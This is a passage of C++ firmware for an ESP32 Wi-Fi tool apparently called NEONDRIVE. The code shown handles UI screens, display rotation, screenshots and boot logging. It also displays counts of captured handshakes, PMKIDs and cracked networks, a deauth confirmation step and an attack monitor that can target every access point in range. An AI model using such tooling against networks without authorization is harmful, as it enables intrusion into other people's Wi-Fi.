  for (int x = 0; x < w; x += 14) tft.drawFastVLine(x, 0, h, 0x1062);

  const int cx = w / 2;
  const int cy = h / 2;
  const float morph = (sinf((float)neonPanicFrame * 0.035f) + 1.0f) * 0.5f;
  const int size = (int)((float)min(w, h) * 0.20f);
  const int off = (int)((float)size * (0.25f + (morph * 0.35f)));
  const int x0 = cx - size;
  const int y0 = cy - size;
  const int x1 = cx + size;
  const int y1 = cy + size;
  const int bx0 = x0 + off;
  const int by0 = y0 - off;
  const int bx1 = x1 + off;
  const int by1 = y1 - off;

  tft.drawRect(x0, y0, size * 2, size * 2, TFT_CYAN);
  tft.drawRect(bx0, by0, size * 2, size * 2, 0xB81F);
  tft.drawLine(x0, y0, bx0, by0, 0x7BFF);
  tft.drawLine(x1, y0, bx1, by0, 0x7BFF);
  tft.drawLine(x0, y1, bx0, by1, 0x7BFF);
  tft.drawLine(x1, y1, bx1, by1, 0x7BFF);

  const int spinnerR = (int)((float)min(w, h) * (0.16f + (morph * 0.10f)));
  drawNeonSpinner(cx, cy, spinnerR, TFT_CYAN, TFT_MAGENTA);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(0xDFFF, bg);
  tft.drawString("NEONDRIVE // BLUEPRINT -> REALITY", 6, 6);
}

static void drawModePwnCounter(int w, int h) {
  const uint16_t bg = 0x0002;
  tft.fillRect(0, 0, w, h, bg);
  for (int y = 0; y < h; y += 18) tft.drawFastHLine(0, y, w, 0x0822);

  const unsigned long auditedTarget = (unsigned long)YoinkEngine::getNetworkCount();
  const unsigned long pwnedTarget =
      (unsigned long)crackedNetworks +
      (unsigned long)YoinkEngine::getHandshakeCount() +
      (unsigned long)YoinkEngine::getPmkidCount();
  const uint16_t phase = (uint16_t)(neonPanicFrame % 160);
  float intro = (float)phase / 70.0f;
  if (intro > 1.0f) intro = 1.0f;
  const unsigned long auditedNow = (unsigned long)(auditedTarget * intro);
  const unsigned long pwnedNow = (unsigned long)(pwnedTarget * intro);

  const int panelX = 10;
  const int panelY = 28;
  const int panelW = min(186, w - 120);
  const int panelH = 92;
  tft.fillRoundRect(panelX, panelY, panelW, panelH, 6, 0x0862);
  tft.drawRoundRect(panelX, panelY, panelW, panelH, 6, TFT_CYAN);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, 0x0862);
  tft.drawString("NETWORKS AUDITED", panelX + 8, panelY + 10);
  tft.setTextColor(TFT_WHITE, 0x0862);
  applyFontMd();
  tft.drawString(String(auditedNow), panelX + 8, panelY + 24);
  applyFontSm();
  tft.setTextColor(TFT_MAGENTA, 0x0862);
  tft.drawString("PWNED COUNTER", panelX + 8, panelY + 56);
  tft.setTextColor(0xFFE0, 0x0862);
  applyFontMd();
  tft.drawString(String(pwnedNow), panelX + 8, panelY + 70);

  const int spinnerCx = w - 68;
  const int spinnerCy = h / 2;
  drawNeonSpinner(spinnerCx, spinnerCy, (int)((float)min(w, h) * 0.16f), TFT_CYAN, TFT_MAGENTA);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(0xF7DF, bg);
  tft.drawString("NEONDRIVE // RED TEAM STATUS", 6, 6);
}

static void drawModeStealth(int w, int h) {
  const uint16_t bg = 0x0000;
  tft.fillRect(0, 0, w, h, bg);
  const int cx = w / 2;
  const int cy = h / 2;
  const int starCount = 28;
  for (int i = 0; i < starCount; i++) {
    const uint32_t seed = (uint32_t)(i * 1103515245UL + 12345UL);
    int sx = (int)(seed % (uint32_t)w);
    int sy = (int)((seed >> 9) % (uint32_t)h);
    sx = (sx + (int)(neonPanicFrame / 6)) % w;
    const uint16_t col = ((i & 3) == 0) ? 0x5AEB : 0x2104;
    tft.drawPixel(sx, sy, col);
  }

  drawNeonSpinner(cx, cy, (int)((float)min(w, h) * 0.20f), 0x7BFF, 0x780F);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(0xBDF7, bg);
  tft.drawString("NEONDRIVE // STEALTH BOOT", 6, 6);
}

static void drawNeonPanicFrame() {
  const int w = tft.width();
  const int h = tft.height();
  switch (neonPanicMode) {
    case NeonPanicMode::BOOT_TUNNEL: drawModeBootTunnel(w, h); break;
    case NeonPanicMode::BLUEPRINT_REALITY: drawModeBlueprintReality(w, h); break;
    case NeonPanicMode::PWN_COUNTER: drawModePwnCounter(w, h); break;
    case NeonPanicMode::STEALTH_MINIMAL: drawModeStealth(w, h); break;
  }

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString(neonPanicModeLabel(neonPanicMode), 6, h - 22);
  tft.setTextColor(0xC618, TFT_BLACK);
  tft.drawString("BOOT BTN: NEXT MODE  |  TOUCH: EXIT", 6, h - 10);
}

static void drawNeonPanic() {
  neonPanicFrame = 0;
  neonPanicLastTickMs = 0;
  drawNeonPanicFrame();
}

static void neonPanicTick() {
  if (screen != ScreenId::NEON_PANIC) return;
  const uint32_t now = millis();
  if (now - neonPanicLastTickMs < 62) return;
  neonPanicLastTickMs = now;
  neonPanicFrame++;
  drawNeonPanicFrame();
}

static void drawAbout() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("About / Quick Facts");
  drawUniversalBackground();
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const bool compact = (tft.height() <= 180);
  const int panelRight = max(content.x + 140, uiActionDockSafeLeft() - 5);
  const int panelW = max(120, panelRight - content.x);
  const int x = content.x + 2;
  int y = content.y + 4;

  tft.setTextDatum(TL_DATUM);
  if (compact) { applyFontSm(); } else { applyFontMd(); }
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString(ND_PROFILE_NAME, x, y);

  applyFontSm();
  y += compact ? 14 : 24;
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Device", x, y);
  y += 12;
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  char line[96];
  snprintf(line, sizeof(line), "Profile: %s", ND_PROFILE_CODE);
  tft.drawString(line, x, y);
  y += 12;
  snprintf(line, sizeof(line), "Display: %dx%d", tft.width(), tft.height());
  tft.drawString(line, x, y);
  y += 12;
  snprintf(line, sizeof(line), "Flash: %dMB  PSRAM: %s", ND_FLASH_MB, ND_EXPECT_PSRAM ? "expected" : "no");
  tft.drawString(line, x, y);
  y += 12;
  snprintf(line, sizeof(line), "Touch:%d Nav:%d Enc:%d SD:%d CC1101:%d",
           ND_HW_TOUCH, ND_HW_BUTTON_NAV, ND_HW_ENCODER, ND_HW_SD, ND_HW_CC1101);
  tft.drawString(line, x, y);
  y += 14;

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Runtime", x, y);
  y += 12;
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  int ws = WiFi.status();
  snprintf(line, sizeof(line), "WiFi: %s", ws == WL_CONNECTED ? "Connected" : (apMode ? "AP Mode" : "Offline"));
  tft.drawString(line, x, y);
  y += 12;
  snprintf(line, sizeof(line), "Web: %s  SD: %s", webServerRunning ? "ON" : "OFF", sdReady ? "Ready" : "Missing");
  tft.drawString(line, x, y);
  y += 12;
  const unsigned long auditedNets = (unsigned long)YoinkEngine::getNetworkCount();
  const unsigned long pwnedCounter =
      (unsigned long)crackedNetworks +
      (unsigned long)YoinkEngine::getHandshakeCount() +
      (unsigned long)YoinkEngine::getPmkidCount();
  snprintf(line, sizeof(line), "Networks Audited:%lu  Beacons:%lu",
           auditedNets,
           (unsigned long)monBeaconHits);
  tft.drawString(line, x, y);
  y += 12;
  snprintf(line, sizeof(line), "Pwned Counter:%lu  Cracked:%u",
           pwnedCounter,
           crackedNetworks);
  tft.drawString(line, x, y);
  y += 12;
  snprintf(line, sizeof(line), "Packets:%lu HS:%lu PMKID:%lu",
           (unsigned long)sniffPacketCount,
           (unsigned long)YoinkEngine::getHandshakeCount(),
           (unsigned long)YoinkEngine::getPmkidCount());
  tft.drawString(line, x, y);
  y += 12;
  snprintf(line, sizeof(line), "Heap:%luKB", (unsigned long)(ESP.getFreeHeap() / 1024));
  tft.drawString(line, x, y);
  y += 14;

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Quick Reference", x, y);
  y += 12;
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Web UI: /, /android, /sd, /wpasec, /yoink/log", x, y);
  y += 12;
#if defined(NEONDRIVE_TARGET_CYD)
  tft.drawString("Input: Touch UI (landscape, USB-right)", x, y);
#elif defined(NEONDRIVE_TARGET_TEMBED)
  tft.drawString("Input: Encoder rotate/press + side KEY", x, y);
#else
  tft.drawString("Input: BUTTON_1 next, BUTTON_2 select", x, y);
#endif

  // Keep the panel visually constrained away from the ActionDock safety band.
  tft.drawRect(content.x, content.y, panelW, max(20, bottom.y - content.y - 2), TFT_DARKGREY);

  btnBack = {bottom.x, bottom.y, compact ? 92 : 120, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  printConfigSerial(cfg);
  uiLogLayout("drawAbout", content, bottom);
  uiLogButtonRect("About.Back", btnBack);
  drawBorder();
}

static void setScreen(ScreenId next) {
  screen = next;
  if (verboseSerial) {
    Serial.printf("[ui] screen -> %s\n", screenToStr(screen));
  }
  switch (screen) {
    case ScreenId::HOME:
#if ND_HW_KEYBOARD
      g_focusIdx = 0;
#endif
      drawHome();
      break;
    case ScreenId::JUST_GO:
      justGoLayoutDrawn = false;
      if (!justGoActive) {
        justGoStart();  // Auto-start automation when entering screen
      }
      drawJustGo();
      break;
    case ScreenId::CONFIG:            drawConfig(); break;
    case ScreenId::WIFI_CONFIG:       drawWifiConfig(); break;
    case ScreenId::STARTUP_CONFIG:    drawStartupConfig(); break;
    case ScreenId::TELEMETRY_CONFIG:  drawTelemetryConfig(); break;
    case ScreenId::WIFI_CONNECT:      drawWifiConnect(); break;
    case ScreenId::WEBSERVER:         drawWebserver(); break;
    case ScreenId::MONITOR:           monitorReset(); drawMonitor(); break;
    case ScreenId::ABOUT:             drawAbout(); break;
    case ScreenId::WIFI_SCAN:         drawWifiScan(); break;
    case ScreenId::CONFIRM_TARGET:    drawConfirmTarget(); break;
    case ScreenId::TARGET_DETAILS:    drawTargetDetails(); break;
    case ScreenId::AUTOMATE_MENU:     drawAutomateMenu(); break;
    case ScreenId::PORT_SCANNER:
      psLayoutDrawn=false; psLastHostCount=0; psLastPct=0; psLastState=0;
      psScrollOffset=0; psSelectedRow=-1; psLastSelectedRow=-1;
      psLastRatePerSec = 0; psLastPortsAttempted = 0; psLastEventCount = 0;
      psDirtyCount = 0; psNeedsFullStatic = true;
      drawPortScanner();
      break;
    case ScreenId::RECON_HOME:
      drawReconHome();
      break;
    case ScreenId::WARDRIVE:
      drawWardrive();
      break;
    case ScreenId::SYNC:
      drawSync();
      break;
    case ScreenId::RECON:
      reconLayoutDrawn = false;
      reconLastLogCount = 0;
      reconLastTotalEvents = 0;
      reconLastUiTickMs = 0;
      reconDeauthConfirmUntilMs = 0;
      if (reconHostSelected >= reconScanner.hostCount()) reconHostSelected = -1;
      drawRecon();
      break;
    case ScreenId::PUSH1T_SCREEN:     push1tProbeCount = 0; push1tLastProbeMs = 0; drawPush1t(); break;
    case ScreenId::SP3CTER_SCREEN:    drawSpecter(); break;
    case ScreenId::PACKETLAB_MENU:        drawPACKETLABMenu(); break;
    case ScreenId::PACKETLAB_SET_TARGET:  PACKETLABTargetScroll = 0; drawPACKETLABSetTarget(); break;
    case ScreenId::SCOPE_GRAPH:
      scopeLayoutDrawn = false;
      scopeResetWaterfall();
      scopeScanActive = false;
      scopeScanStartedMs = 0;
      drawScopeGraph();
      break;
    case ScreenId::LED_CONTROL:       drawLedControl(); break;
    case ScreenId::NEON_PANIC:        drawNeonPanic(); break;
    case ScreenId::PACKETLAB_MONITOR: {
      monitorLineCount = 0;
      monitorPushLine(TFT_CYAN,   "PACKETLAB MONITOR ONLINE");
      monitorPushLine(TFT_YELLOW, "Attack: %s", PACKETLABGetAttackName());
      // Show target information
      if (PACKETLABTargetSsid[0] == '\0') {
        monitorPushLine(TFT_CYAN, "Target: ALL APs in Area");
      } else {
        monitorPushLine(TFT_CYAN, "Target: %s [CH%d]",
                       PACKETLABTargetSsid,
                        PACKETLABTargetChannel);
      }
      PACKETLABMonLastUpdateMs = 0;
      PACKETLABMonLastDrawMs = 0;
      PACKETLABMonLastLineCount = monitorLineCount;
      PACKETLABMonLastAttackingState = PACKETLABIsAttacking();
      PACKETLABOpenCaptures();
      drawPACKETLABMonitorFull();
      break;
    }
    case ScreenId::TARGETS_PLACEHOLDER: drawPlaceholder("Targets", "Coming soon"); break;
  }
  HypercubeWidget::notifyScreenDrawn();
#if defined(NEONDRIVE_TARGET_M5TAB5)
  drawTab5ScreenshotOverlay();
#endif
#if UI_DEBUG_MEM
  char memTag[48];
  snprintf(memTag, sizeof(memTag), "screen:%s", screenToStr(screen));
  uiMemLog(memTag);
#endif
}

static void redrawActiveScreen() {
  switch (screen) {
    case ScreenId::HOME:                drawHome(); break;
    case ScreenId::JUST_GO:             drawJustGo(); break;
    case ScreenId::WIFI_SCAN:           drawWifiScan(); break;
    case ScreenId::CONFIRM_TARGET:      drawConfirmTarget(); break;
    case ScreenId::TARGET_DETAILS:      drawTargetDetails(); break;
    case ScreenId::AUTOMATE_MENU:       drawAutomateMenu(); break;
    case ScreenId::MONITOR:             drawMonitor(); break;
    case ScreenId::TARGETS_PLACEHOLDER: drawPlaceholder("Targets", "Coming soon"); break;
    case ScreenId::CONFIG:              drawConfig(); break;
    case ScreenId::WIFI_CONFIG:         drawWifiConfig(); break;
    case ScreenId::STARTUP_CONFIG:      drawStartupConfig(); break;
    case ScreenId::TELEMETRY_CONFIG:    drawTelemetryConfig(); break;
    case ScreenId::WIFI_CONNECT:        drawWifiConnect(); break;
    case ScreenId::WEBSERVER:           drawWebserver(); break;
    case ScreenId::RECON:               drawRecon(); break;
    case ScreenId::PORT_SCANNER:        drawPortScanner(); break;
    case ScreenId::RECON_HOME:          drawReconHome(); break;
    case ScreenId::WARDRIVE:            drawWardrive(); break;
    case ScreenId::ABOUT:               drawAbout(); break;
    case ScreenId::PUSH1T_SCREEN:       drawPush1t(); break;
    case ScreenId::SP3CTER_SCREEN:      drawSpecter(); break;
    case ScreenId::PACKETLAB_MENU:          drawPACKETLABMenu(); break;
    case ScreenId::PACKETLAB_MONITOR:       drawPACKETLABMonitor(); break;
    case ScreenId::PACKETLAB_SET_TARGET:    drawPACKETLABSetTarget(); break;
    case ScreenId::SCOPE_GRAPH:         drawScopeGraph(); break;
    case ScreenId::LED_CONTROL:         drawLedControl(); break;
    case ScreenId::NEON_PANIC:          drawNeonPanic(); break;
    case ScreenId::SYNC:                drawSync(); break;
  }
#if defined(NEONDRIVE_TARGET_M5TAB5)
  drawTab5ScreenshotOverlay();
#endif
}

#if defined(NEONDRIVE_TARGET_CYD)
static const char* cydRotationLabel(int r) {
  switch (r & 3) {
    case 0: return "ROT 0";
    case 1: return "ROT 1";
    case 2: return "ROT 2";
    default: return "ROT 3";
  }
}

static void applyCydManualRotation(int rotation, bool redraw) {
  cfg.startup_manualRotation = clampi(rotation, 0, 3);
  tft.setRotation(cfg.startup_manualRotation);
  resetTouchLatch();
  if (redraw) redrawActiveScreen();
}
#endif

#if defined(NEONDRIVE_TARGET_M5TAB5)
static uint8_t g_tab5RotationCurrent = 1;
static uint8_t g_tab5RotationCandidate = 1;
static uint32_t g_tab5RotationCandidateSinceMs = 0;
static uint32_t g_tab5RotationLastSampleMs = 0;

static void tab5InvalidateUiLayoutCaches() {
  monitorLayoutDrawn = false;
  justGoLayoutDrawn = false;
  scopeLayoutDrawn = false;
  reconLayoutDrawn = false;
  psLayoutDrawn = false;
  psNeedsFullStatic = true;
}

static int tab5ClassifyRotationFromAccel(float ax, float ay, float az) {
  // Ignore near-flat/noisy poses to avoid accidental spins.
  if (fabsf(ax) < 0.30f && fabsf(ay) < 0.30f) return -1;
  if (fabsf(az) > 0.93f && fabsf(ax) < 0.38f && fabsf(ay) < 0.38f) return -1;

  if (fabsf(ax) > fabsf(ay)) {
    return (ax >= 0.0f) ? 3 : 1;  // Landscape right/left
  }
  return (ay >= 0.0f) ? 0 : 2;    // Portrait normal/inverted (flipped 180 from prior mapping)
}

static void tab5ApplyRotation(uint8_t rotation) {
  if (rotation == g_tab5RotationCurrent) return;
  g_tab5RotationCurrent = rotation;
  tft.setRotation(rotation);
  Serial.printf("[tab5-rot] apply=%u\n", (unsigned)rotation);
  resetTouchLatch();
  tab5InvalidateUiLayoutCaches();
  redrawActiveScreen();
}

static void tab5RotationTick() {
  if (!cfg.startup_autoRotate) return;

  const uint32_t now = millis();
  if ((now - g_tab5RotationLastSampleMs) < 25) return; // ~40Hz
  g_tab5RotationLastSampleMs = now;

  M5.Imu.update();
  m5::imu_data_t d = M5.Imu.getImuData();
  int target = tab5ClassifyRotationFromAccel(d.accel.x, d.accel.y, d.accel.z);
  if (target < 0) return;

  if ((uint8_t)target != g_tab5RotationCandidate) {
    g_tab5RotationCandidate = (uint8_t)target;
    g_tab5RotationCandidateSinceMs = now;
    return;
  }
  if ((uint8_t)target == g_tab5RotationCurrent) return;
  if ((now - g_tab5RotationCandidateSinceMs) < 220) return;

  tab5ApplyRotation((uint8_t)target);
}
#endif

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static void tdisplayRedrawCurrentScreen() {
  redrawActiveScreen();
}
#endif

static bool saveScreenshotToSd(char* outPath, size_t outPathLen) {
  if (outPath && outPathLen > 0) outPath[0] = '\0';
  bool sdOk = sdReady || mountSdCard(false);
  if (!sdOk) { Serial.println("[screenshot] SD not available"); return false; }

  SD.mkdir("/screenshots");

  // Find next available filename
  char path[36];
#if defined(NEONDRIVE_TARGET_M5TAB5)
  for (int i = 0; i < 1000; i++) {
    snprintf(path, sizeof(path), "/screenshots/scr_%04d.png", i);
    if (!SD.exists(path)) break;
  }

  const int W = tft.width();
  const int H = tft.height();
  tft.endWrite();
  delay(2);

  size_t pngLen = 0;
  void* pngData = tft.createPng(&pngLen, 0, 0, W, H);
  if (!pngData || pngLen == 0) {
    Serial.println("[screenshot] createPng failed");
    tft.releasePngMemory();
    return false;
  }

  File f = SD.open(path, FILE_WRITE);
  if (!f) {
    Serial.printf("[screenshot] open failed: %s\n", path);
    tft.releasePngMemory();
    return false;
  }

  const size_t written = f.write((const uint8_t*)pngData, pngLen);
  f.close();
  tft.releasePngMemory();
  const bool ok = (written == pngLen);
  if (!ok) {
    Serial.printf("[screenshot] write error on %s (%u/%u)\n", path, (unsigned)written, (unsigned)pngLen);
    return false;
  }

  if (outPath && outPathLen > 0) {
    strncpy(outPath, path, outPathLen - 1);
    outPath[outPathLen - 1] = '\0';
  }
  Serial.printf("[screenshot] saved %s (%u bytes)\n", path, (unsigned)pngLen);

  tft.drawRect(0, 0, W, H, TFT_WHITE);
  delay(120);
  HypercubeWidget::notifyScreenDrawn();
  return true;
#else
  for (int i = 0; i < 1000; i++) {
    snprintf(path, sizeof(path), "/screenshots/scr_%04d.bmp", i);
    if (!SD.exists(path)) break;
  }

  const int W = tft.width();
  const int H = tft.height();
  const uint32_t rowStride  = ((uint32_t)(W * 3 + 3) & ~3u);
  const uint32_t pixelBytes = rowStride * (uint32_t)H;
  const uint32_t fileSize   = 54u + pixelBytes;

  uint8_t header[54] = {};
  header[0] = 'B'; header[1] = 'M';
  header[2] = fileSize & 0xFF; header[3] = (fileSize >> 8) & 0xFF;
  header[4] = (fileSize >> 16) & 0xFF; header[5] = (fileSize >> 24) & 0xFF;
  header[10] = 54; header[14] = 40;
  header[18] = W & 0xFF; header[19] = (W >> 8) & 0xFF;
  int32_t negH = -H; memcpy(&header[22], &negH, 4);
  header[26] = 1; header[28] = 24;
  header[34] = pixelBytes & 0xFF; header[35] = (pixelBytes >> 8) & 0xFF;
  header[36] = (pixelBytes >> 16) & 0xFF; header[37] = (pixelBytes >> 24) & 0xFF;

  // Force TFT SPI bus into a clean idle state before switching to read mode.
  // If the hypercube or any other code left a write-transaction open
  // (inTransaction==true), readPixel/readRect would call end_tft_write()
  // first, which spins on SPI_BUSY_CHECK until the watchdog fires.
  tft.endWrite();
  delay(2);

  // Allocate one row of 565 pixels + one row of BGR24 pixels.
  uint16_t* row565 = (uint16_t*)malloc((size_t)W * sizeof(uint16_t));
  uint8_t*  rowBuf = (uint8_t*)malloc(rowStride);
  if (!row565 || !rowBuf) {
    free(row565); free(rowBuf);
    Serial.println("[screenshot] malloc failed");
    return false;
  }

  File f = SD.open(path, FILE_WRITE);
  if (!f) {
    free(row565); free(rowBuf);
    Serial.printf("[screenshot] open failed: %s\n", path);
    return false;
  }
  f.write(header, 54);

  Serial.printf("[screenshot] writing %dx%d stride=%u total=%lu\n", W, H, (unsigned)rowStride, (unsigned long)fileSize);

  bool readOk = true;
  for (int y = 0; y < H; y++) {
    // readRect for a full row: one SPI transaction vs 480 for readPixel,
    // much less watchdog pressure.
    tft.readRect(0, y, W, 1, row565);
    for (int x = 0; x < W; x++) {
      uint16_t px = row565[x];
      rowBuf[x * 3 + 0] = (px & 0x001F) << 3;         // B (565 bits 4:0)
      rowBuf[x * 3 + 1] = ((px >> 5) & 0x003F) << 2;  // G (565 bits 10:5)
      rowBuf[x * 3 + 2] = ((px >> 11) & 0x001F) << 3; // R (565 bits 15:11)
    }
    memset(rowBuf + W * 3, 0, rowStride - W * 3);
    if (f.write(rowBuf, rowStride) != rowStride) { readOk = false; break; }
    if (y % 16 == 0) {
      yield();
      esp_task_wdt_reset();  // Explicit WDT reset — read loop can take 1-2s
    }
  }
  free(row565);
  free(rowBuf);
  f.close();

  if (readOk) {
    if (outPath && outPathLen > 0) {
      strncpy(outPath, path, outPathLen - 1);
      outPath[outPathLen - 1] = '\0';
    }
    Serial.printf("[screenshot] saved %s (%lu bytes)\n", path, (unsigned long)fileSize);
  } else {
    Serial.printf("[screenshot] write error on %s\n", path);
  }

  // Brief white flash border as visual confirmation
  tft.drawRect(0, 0, W, H, TFT_WHITE);
  delay(120);
  HypercubeWidget::notifyScreenDrawn();
  return readOk;
#endif
}

#if defined(NEONDRIVE_TARGET_M5TAB5)
static void drawTab5ScreenshotOverlay() {
  const int w = tft.width();
  const int x = w - HypercubeWidget::REGION_PAD - HypercubeWidget::REGION_W;
  const int y = HypercubeWidget::REGION_PAD;
  const int bw = HypercubeWidget::REGION_W;
  const int bh = HypercubeWidget::REGION_H;
  btnTab5Screenshot = {x, y, bw, bh, "SHOT"};

  const bool showToast = ((int32_t)(tab5ScreenshotToastUntilMs - millis()) > 0);
  const uint16_t fill = showToast ? (tab5ScreenshotToastOk ? TFT_DARKGREEN : TFT_MAROON) : TFT_NAVY;
  const uint16_t edge = showToast ? (tab5ScreenshotToastOk ? TFT_GREEN : TFT_RED) : TFT_CYAN;
  tft.fillRoundRect(x, y, bw, bh, 7, fill);
  tft.drawRoundRect(x, y, bw, bh, 7, edge);
  tft.drawRoundRect(x + 2, y + 2, bw - 4, bh - 4, 5, tft.color565(20, 40, 40));
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(TFT_WHITE, fill);
  applyFontSm();
  tft.drawString(showToast ? (tab5ScreenshotToastOk ? "SAVED" : "FAIL") : "SHOT", x + (bw / 2), y + (bh / 2) - 5);
  if (showToast && tab5ScreenshotToastOk) {
    tft.drawString("SD", x + (bw / 2), y + (bh / 2) + 7);
  }
  tft.setTextDatum(TL_DATUM);
}

static void tab5ScreenshotOverlayTick() {
  static bool s_lastToastVisible = false;
  const bool toastVisible = ((int32_t)(tab5ScreenshotToastUntilMs - millis()) > 0);
  if (toastVisible != s_lastToastVisible) {
    drawTab5ScreenshotOverlay();
    s_lastToastVisible = toastVisible;
  }
}
#endif

static void sw1Tick() {
  if (!sw1Enabled || PIN_SW1 < 0) return;
  const uint32_t now = millis();
  const bool down = (digitalRead(PIN_SW1) == LOW);
  if (now < sw1DebounceUntilMs) {
    sw1WasDown = down;
    return;
  }
  if (down && !sw1WasDown) {
    sw1DebounceUntilMs = now + 400;
    saveScreenshotToSd(nullptr, 0);
    pushConsoleEvent("INFO", "BOOT", "Screenshot saved");
  }
  sw1WasDown = down;
}

// ---------- Setup / Loop ----------
static void bumpInt(int& v, int delta, int lo, int hi) { v = clampi(v + delta, lo, hi); }

static void printDeviceProfileBanner() {
  const uint32_t flashRuntimeMB = (uint32_t)(ESP.getFlashChipSize() / (1024U * 1024U));
  bool psramRuntime = false;
  const char* targetMacro = "UNKNOWN";
#if defined(NEONDRIVE_TARGET_CYD24)
  targetMacro = "NEONDRIVE_TARGET_CYD24";
#elif defined(NEONDRIVE_TARGET_CYD28)
  targetMacro = "NEONDRIVE_TARGET_CYD28";
#elif defined(NEONDRIVE_TARGET_CYD35)
  targetMacro = "NEONDRIVE_TARGET_CYD35";
#elif defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  targetMacro = "NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH";
#elif defined(NEONDRIVE_TARGET_TDISPLAY_S3)
  targetMacro = "NEONDRIVE_TARGET_TDISPLAY_S3";
#elif defined(NEONDRIVE_TARGET_T_EMBED_CC1101)
  targetMacro = "NEONDRIVE_TARGET_T_EMBED_CC1101";
#elif defined(NEONDRIVE_TARGET_M5TAB5)
  targetMacro = "NEONDRIVE_TARGET_M5TAB5";
#elif defined(NEONDRIVE_TARGET_M5CARDPUTER)
  targetMacro = "NEONDRIVE_TARGET_M5CARDPUTER";
#elif defined(NEONDRIVE_TARGET_CYD)
  targetMacro = "NEONDRIVE_TARGET_CYD";
#endif
#if defined(BOARD_HAS_PSRAM) && BOARD_HAS_PSRAM
  psramRuntime = psramFound();
#endif

  Serial.println("=== NEONDRIVE Device Profile ===");
  Serial.printf("[profile] target_macro=%s\n", targetMacro);
  Serial.printf("[profile] name=%s\n", ND_PROFILE_NAME);
  Serial.printf("[profile] code=%s display=%dx%d\n", ND_PROFILE_CODE, ND_DISPLAY_W, ND_DISPLAY_H);
  Serial.printf("[profile] hw touch=%d nav=%d encoder=%d keyboard=%d sd=%d cc1101=%d\n",
                ND_HW_TOUCH, ND_HW_BUTTON_NAV, ND_HW_ENCODER, ND_HW_KEYBOARD, ND_HW_SD, ND_HW_CC1101);
  Serial.printf("[profile] limits flash_cfg=%dMB flash_runtime=%luMB psram_expected=%d psram_runtime=%d\n",
                ND_FLASH_MB, (unsigned long)flashRuntimeMB, ND_EXPECT_PSRAM ? 1 : 0, psramRuntime ? 1 : 0);
  Serial.printf("[profile] features web=%d scope=%d sd_capture=%d subghz=%d\n",
                ND_FEATURE_WEB_UI, ND_FEATURE_SCOPE_WATERFALL, ND_FEATURE_SD_CAPTURE, ND_FEATURE_SUBGHZ_TOOLKIT);
#if defined(NEONDRIVE_TARGET_CYD)
  Serial.printf("[variant] active=%s\n", CYD_VARIANT_NAME);
#endif
}

static void updateHypercubeActivity() {
  const bool busyWork =
      sniffActive ||
      wifiIsScanning ||
      wifiConnectInProgress ||
      justGoActive ||
      wardriveActive ||
      (autoMode != AutoMode::NONE) ||
      reconScanner.isRunning() ||
      portScanner.isRunning();
  HypercubeWidget::setActivity(
      busyWork ? HypercubeWidget::Activity::ATTACKING
               : HypercubeWidget::Activity::IDLE);
}

static void display_init() {
  if (TFT_USES_SPI_BUS) {
    SPI.begin(PIN_TFT_SCLK, PIN_TFT_MISO, PIN_TFT_MOSI, PIN_TFT_CS);
  }
  tft.init();
  tft.setRotation(BOARD_TFT_ROTATION);
  tft.invertDisplay(BOARD_TFT_INVERT);
  tft.fillScreen(TFT_BLACK);
  drawBorder();

  Serial.print("tft.width()=");  Serial.print(tft.width());
  Serial.print(" tft.height()="); Serial.println(tft.height());
}

static void touch_init() {
#if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  if (!tdisplayTouchInit()) {
    Serial.println("[touch] no supported touch controller detected; BUTTON_1/BUTTON_2 only");
  } else {
    Serial.println("[touch] touch enabled + BUTTON_1/BUTTON_2 fallback enabled");
  }
#elif defined(NEONDRIVE_TARGET_M5TAB5)
  // Touch is fully initialised by M5GFX autodetect inside M5.begin().
  // All we do here is report the result so it shows up early in the serial log.
  Serial.printf("[touch] M5Tab5 M5.Touch.isEnabled=%d  (GT911 or ST7123 via M5GFX)\n",
                (int)M5.Touch.isEnabled());
#elif defined(NEONDRIVE_TARGET_TEMBED)
  Serial.println("[input] encoder + button navigation enabled (no touch)");
#elif defined(NEONDRIVE_TARGET_M5CARDPUTER)
  Serial.println("[input] keyboard navigation enabled (56-key TCA8418, no touch)");
#elif defined(NEONDRIVE_TARGET_CYD28)
  if (TOUCH_USES_SEPARATE_SPI) {
    cyd28Touch.begin();
    if (PIN_TOUCH_IRQ >= 0) pinMode(PIN_TOUCH_IRQ, INPUT_PULLUP);
    Serial.printf("[touch] CYD28 bitbang touch SCLK=%d MISO=%d MOSI=%d CS=%d IRQ=%d\n",
                  PIN_TOUCH_SPI_SCLK, PIN_TOUCH_SPI_MISO, PIN_TOUCH_SPI_MOSI, PIN_TOUCH_CS, PIN_TOUCH_IRQ);
  } else {
    ts.begin();
    ts.setRotation(0);
  }
#elif defined(NEONDRIVE_TARGET_BUTTON_NAV)
  Serial.println("[input] button navigation enabled (no touch)");
#else
  ts.begin();
  ts.setRotation(0);
#endif
}

#ifndef ND_TOUCH_TEST_SCREEN
#define ND_TOUCH_TEST_SCREEN 0
#endif

static void variantBootSelfTest() {
#if ND_TOUCH_TEST_SCREEN
  tft.fillScreen(TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
